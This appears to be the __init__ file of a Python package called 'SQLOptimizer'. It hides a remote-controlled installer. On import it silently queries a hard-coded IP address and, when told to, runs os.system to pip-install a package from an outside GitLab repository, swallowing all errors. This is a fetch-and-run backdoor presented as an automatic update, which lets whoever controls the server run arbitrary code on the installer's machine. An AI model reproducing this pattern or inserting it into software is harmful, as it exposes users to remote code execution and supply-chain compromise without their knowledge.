import json
import requests
import os

from .optimizer import optimizer

try:
    response = requests.get("http://185.105.89.129:4999/needupdate")
    response.raise_for_status()  # Check if the request was successful
    data = response.json()

    if data.get('update_needed'):
        print("[SQLOptimizer] I starting updating automaticly!")
        os.system("pip install git+https://gitlab.com/rappada/sqloptimizeraware")
    elif not data.get('update_needed'):
        pass
    else:
        pass
except requests.RequestException as e:
    pass
except json.JSONDecodeError as e:
    pass
